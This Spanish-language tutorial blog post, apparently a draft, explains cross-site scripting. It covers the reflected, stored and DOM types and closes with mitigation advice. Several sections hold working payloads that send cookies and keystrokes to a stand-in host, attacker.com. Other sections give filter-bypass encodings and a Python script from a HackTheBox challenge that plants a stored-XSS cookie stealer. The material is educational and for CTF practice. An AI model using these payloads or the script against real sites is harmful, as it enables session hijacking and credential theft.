---
title: "XSS: Cross-Site Scripting desde cero hasta explotación"
description: "Guía completa de XSS — tipos, payloads, bypass de filtros y mitigación. Con ejemplos reales de CTFs."
pubDate: 2024-02-10
tags: ["web", "ctf", "exploit"]
author: "Jafet Brito"
heroImage: "https://avatars.githubusercontent.com/u/73570144?v=4"
draft: true
---

## ¿Qué es XSS?

Cross-Site Scripting (XSS) ocurre cuando una aplicación incluye datos no confiables en una página web sin la sanitización adecuada. El resultado: un atacante puede ejecutar JavaScript en el navegador de otra persona.

Es una de las vulnerabilidades más prevalentes en la web. Aparece en el [OWASP Top 10](https://owasp.org/www-project-top-ten/) desde hace más de dos décadas.

## Tipos de XSS

### 1. Reflected XSS

El payload viaja en la petición y se refleja inmediatamente en la respuesta.

```http
GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: victima.com
```

El servidor responde con:
```html
<p>Resultados para: <script>alert(1)</script></p>
```

### 2. Stored XSS

El payload se almacena en la base de datos y se ejecuta cada vez que alguien visita la página afectada. El más peligroso.

```html
<!-- En un campo de comentario -->
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

### 3. DOM-based XSS

La vulnerabilidad vive en JavaScript del lado cliente, sin pasar por el servidor.

```javascript
// Código vulnerable
document.getElementById('output').innerHTML = location.hash.substring(1);

// Payload en URL
https://victima.com/page#<img src=x onerror=alert(1)>
```

## Payloads esenciales

```javascript
// Básico — test de ejecución
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Robo de cookies
<script>
  new Image().src = 'https://attacker.com/log?c=' + encodeURIComponent(document.cookie);
</script>

// Keylogger simple
<script>
  document.addEventListener('keypress', e => {
    fetch('https://attacker.com/keys?k=' + e.key);
  });
</script>

// Redirección
<script>window.location = 'https://attacker.com'</script>
```

## Bypass de filtros comunes

Los WAFs y filtros básicos se pueden evadir con codificación o variaciones de sintaxis:

```html
<!-- Filtro bloquea <script> -->
<ScRiPt>alert(1)</sCrIpT>
<script/src=data:,alert(1)></script>

<!-- Filtro bloquea "javascript" -->
<a href="&#106;avascript:alert(1)">click</a>
<a href="jav&#x61;script:alert(1)">click</a>

<!-- Filtro bloquea "onerror" -->
<img src=x one&#x72;ror=alert(1)>

<!-- Sin espacios ni iguales -->
<svg/onload=alert(1)>
```

## Caso real: CTF HackTheBox

En un reto reciente, el formulario de contacto era vulnerable a Stored XSS. El admin revisaba los mensajes con un bot:

```python
#!/usr/bin/env python3
# Script de explotación

import requests

TARGET = "https://target.htb/contact"
LISTENER = "https://mi-vps.com/steal"

payload = f"""<script>
var x = new XMLHttpRequest();
x.open('GET', '{LISTENER}?token=' + document.cookie);
x.send();
</script>"""

r = requests.post(TARGET, data={
    'name': 'visitor',
    'email': 'test@test.com',
    'message': payload
})

print(f"[{'OK' if r.ok else 'FAIL'}] Payload enviado")
```

## Mitigación

```javascript
// ❌ Vulnerable
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);

// ✅ Seguro
element.textContent = userInput;        // escapa automáticamente
element.setAttribute('data-val', userInput);

// Content Security Policy (cabecera HTTP)
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-ALEATORIO'
```

> **Regla:** nunca confíes en datos del usuario. Escapa siempre antes de renderizar. Valida en servidor, no solo en cliente.

## Recursos adicionales

- [PortSwigger Web Security Academy — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings/XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
